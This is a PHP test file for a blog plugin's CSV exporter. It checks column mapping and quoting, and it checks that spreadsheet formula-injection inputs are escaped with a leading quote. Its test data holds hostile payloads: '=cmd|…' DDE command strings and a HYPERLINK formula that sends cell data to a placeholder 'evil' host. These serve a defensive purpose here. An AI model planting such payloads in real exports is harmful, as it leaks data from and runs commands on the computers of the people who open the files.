<?php

declare(strict_types=1);

use Magna\Testing\PluginTestCase;
use Magna\Users\User;
use MagnaCms\Blog\Models\Category;
use MagnaCms\Blog\Models\Post;
use MagnaCms\Blog\Support\PostCsvExporter;

uses(PluginTestCase::class);

beforeEach(function (): void {
    $this->enablePlugin('magna-cms/blog');
});

it('exports selected posts to CSV with a header and mapped columns', function (): void {
    $category = Category::create(['name' => 'News', 'slug' => 'news']);
    $post = Post::create([
        'title' => 'Hello, World',
        'slug' => 'hello-world',
        'status' => 'published',
        'visibility' => 'public',
        'category_id' => $category->id,
        'published_at' => now()->subDay(),
    ]);
    $post->forceFill(['views' => 12, 'is_featured' => true])->save();

    $csv = app(PostCsvExporter::class)->toCsv(Post::with('category')->get());
    $lines = array_values(array_filter(explode("\n", trim($csv))));

    expect($lines[0])->toContain('id,title,slug,status,visibility,category,author,published_at,views,featured')
        ->and($csv)->toContain('News')
        ->and($csv)->toContain('published')
        ->and($csv)->toContain('12')
        // A comma in the title must be quoted, not split into extra columns.
        ->and($csv)->toContain('"Hello, World"');
});

it('returns just a header row when nothing is selected', function (): void {
    $csv = app(PostCsvExporter::class)->toCsv(Post::query()->whereRaw('1 = 0')->get());

    expect(trim($csv))->toBe('id,title,slug,status,visibility,category,author,published_at,views,featured');
});

/** Parse a full CSV string into rows via a real CSV reader (handles quoted
 *  embedded commas / quotes / newlines correctly, unlike explode). */
function parseCsv(string $csv): array
{
    $handle = fopen('php://temp', 'r+');
    fwrite($handle, $csv);
    rewind($handle);
    $rows = [];
    while (($row = fgetcsv($handle, 0, ',', '"', '')) !== false) {
        $rows[] = $row;
    }
    fclose($handle);

    return $rows;
}

it('neutralises formula-injection payloads in the title cell', function (string $payload): void {
    $post = Post::create([
        'title' => $payload,
        'slug' => 'inj-'.md5($payload),
        'status' => 'draft',
        'visibility' => 'public',
    ]);

    $csv = app(PostCsvExporter::class)->toCsv(Post::query()->whereKey($post->id)->get());
    $rows = parseCsv($csv);

    // The title cell is the payload prefixed with a single quote, so a
    // spreadsheet treats it as literal text rather than a formula.
    expect($rows[1][1])->toBe("'".$payload);
})->with([
    'equals' => ['=1+1'],
    'plus' => ['+1+1'],
    'minus' => ['-1+1'],
    'at' => ['@SUM(A1:A9)'],
    'tab' => ["\t=1+1"],
    'carriage return' => ["\r=1+1"],
    'hyperlink exfil' => ['=HYPERLINK("http://evil/"&A1,"x")'],
]);

it('neutralises formula payloads in every attacker-controlled text cell', function (): void {
    $category = Category::create(['name' => '=cmd|category', 'slug' => 'cat-inj']);
    $author = User::factory()->create(['name' => '=cmd|author']);

    $post = Post::create([
        'title' => '=cmd|title',
        'slug' => 'multi-inj',
        'status' => 'draft',
        'visibility' => 'public',
        'category_id' => $category->id,
        'author_id' => $author->id,
    ]);

    $csv = app(PostCsvExporter::class)->toCsv(
        Post::with(['category', 'author'])->whereKey($post->id)->get(),
    );
    $rows = parseCsv($csv);

    // title, category, author columns all guarded (indexes 1, 5, 6).
    expect($rows[1][1])->toBe("'=cmd|title")
        ->and($rows[1][5])->toBe("'=cmd|category")
        ->and($rows[1][6])->toBe("'=cmd|author");
});

it('leaves ordinary values unchanged and keeps commas/quotes/newlines valid CSV', function (): void {
    $post = Post::create([
        'title' => 'Hello, "world"'."\n".'line two',
        'slug' => 'ordinary',
        'status' => 'draft',
        'visibility' => 'public',
    ]);

    $csv = app(PostCsvExporter::class)->toCsv(Post::query()->whereKey($post->id)->get());
    $rows = parseCsv($csv);

    // Ordinary text is not prefixed, and the embedded comma/quote/newline
    // round-trip verbatim through a strict RFC 4180 parser.
    expect($rows[1][1])->toBe('Hello, "world"'."\n".'line two')
        ->and($rows[1][2])->toBe('ordinary');
});
